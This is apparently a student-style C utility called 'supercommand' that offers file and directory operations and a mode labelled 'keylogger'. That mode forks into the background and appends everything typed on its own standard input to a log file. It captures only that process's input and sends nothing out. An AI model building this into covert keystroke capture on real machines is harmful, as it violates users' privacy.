#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>
#include <string.h>
#include <time.h>

// Function declarations
void file_operations(int operation, char *arg1, char *arg2);
void directory_operations(int operation, char *arg1);
void keylogger_operations(char *logfile);
void print_usage();

int main(int argc, char *argv[]) {
    if (argc < 3) {
        print_usage();
        return 1;
    }

    int mode = atoi(argv[2]);

    switch (mode) {
        case 1: // File operations
            if (argc < 5) {
                print_usage();
                return 1;
            }
            file_operations(atoi(argv[3]), argv[4], argc == 6 ? argv[5] : NULL);
            break;

        case 2: // Directory operations
            if (argc < 4) {
                print_usage();
                return 1;
            }
            directory_operations(atoi(argv[3]), argc == 5 ? argv[4] : NULL);
            break;

        case 3: // Keylogger operations
            if (argc < 4) {
                print_usage();
                return 1;
            }
            keylogger_operations(argv[3]);
            break;

        default:
            printf("Invalid mode specified.\n");
            print_usage();
    }

    return 0;
}

// File operations
void file_operations(int operation, char *arg1, char *arg2) {
    int fd;
    mode_t new_permissions;
    char content[1024];

    switch (operation) {
        case 1: // Create/Open a file
            fd = open(arg1, O_CREAT | O_WRONLY, 0644);
            if (fd < 0) {
                perror("Error creating/opening file");
            } else {
                printf("File '%s' created/opened successfully.\n", arg1);
                close(fd);
            }
            break;

        case 2: // Change file permissions
            new_permissions = strtol(arg2, NULL, 8);
            if (chmod(arg1, new_permissions) == 0) {
                printf("Permissions for '%s' changed successfully.\n", arg1);
            } else {
                perror("Error changing file permissions");
            }
            break;

        case 3: // Read from a file
            fd = open(arg1, O_RDONLY);
            if (fd < 0) {
                perror("Error opening file");
            } else {
                printf("Contents of '%s':\n", arg1);
                ssize_t bytes_read;
                while ((bytes_read = read(fd, content, sizeof(content) - 1)) > 0) {
                    content[bytes_read] = '\0';
                    printf("%s", content);
                }
                if (bytes_read < 0) {
                    perror("Error reading file");
                }
                close(fd);
            }
            break;

        case 4: // Write to a file
            fd = open(arg1, O_WRONLY | O_APPEND);
            if (fd < 0) {
                perror("Error opening file");
            } else {
                printf("Enter the text to write to the file: ");
                fgets(content, sizeof(content), stdin);
                if (write(fd, content, strlen(content)) < 0) {
                    perror("Error writing to file");
                } else {
                    printf("Text written to '%s' successfully.\n", arg1);
                }
                close(fd);
            }
            break;

        case 5: // Remove a file
            if (remove(arg1) == 0) {
                printf("File '%s' deleted successfully.\n", arg1);
            } else {
                perror("Error deleting file");
            }
            break;

        default:
            printf("Invalid file operation.\n");
    }
}

// Directory operations
void directory_operations(int operation, char *arg1) {
    DIR *dir;
    struct dirent *entry;
    char cwd[1024];

    switch (operation) {
        case 1: // Create a directory
            if (mkdir(arg1, 0755) == 0) {
                printf("Directory '%s' created successfully.\n", arg1);
            } else {
                perror("Error creating directory");
            }
            break;

        case 2: // Delete a directory
            if (rmdir(arg1) == 0) {
                printf("Directory '%s' deleted successfully.\n", arg1);
            } else {
                perror("Error deleting directory");
            }
            break;

        case 3: // Print current working directory
            if (getcwd(cwd, sizeof(cwd)) != NULL) {
                printf("Current working directory: %s\n", cwd);
            } else {
                perror("Error getting current working directory");
            }
            break;

        case 4: // List current directory and files
            dir = opendir(arg1 ? arg1 : ".");
            if (dir == NULL) {
                perror("Error opening directory");
            } else {
                printf("Contents of '%s':\n", arg1 ? arg1 : ".");
                while ((entry = readdir(dir)) != NULL) {
                    printf("%s\n", entry->d_name);
                }
                closedir(dir);
            }
            break;

        default:
            printf("Invalid directory operation.\n");
    }
}

// Keylogger operations
void keylogger_operations(char *logfile) {
    pid_t pid = fork();

    if (pid < 0) {
        perror("Failed to fork process");
        exit(EXIT_FAILURE);
    }

    if (pid > 0) {
        printf("Keylogger process started in the background. PID: %d\n", pid);
        return;
    }

    int fd = open(logfile, O_CREAT | O_WRONLY | O_APPEND, 0644);
    if (fd < 0) {
        perror("Error opening keylog file");
        exit(EXIT_FAILURE);
    }

    time_t now = time(NULL);
    dprintf(fd, "\n--- Keylogger Session Started: %s---\n", ctime(&now));

    char c;
    while (1) {
        c = getchar();
        if (c != EOF) {
            write(fd, &c, 1);
        }
    }

    close(fd);
    exit(0);
}

// Print usage instructions
void print_usage() {
    printf("\nUsage:\n");
    printf("./supercommand -m <mode> <operation> [arguments]\n");
    printf("Modes:\n");
    printf("1 - File Operations\n");
    printf("2 - Directory Operations\n");
    printf("3 - Keylogger Operations\n");
    printf("Examples:\n");
    printf("File: ./supercommand -m 1 1 newFile.txt\n");
    printf("Dir: ./supercommand -m 2 3 .\n");
    printf("Keylogger: ./supercommand -m 3 keylog.txt\n");
}
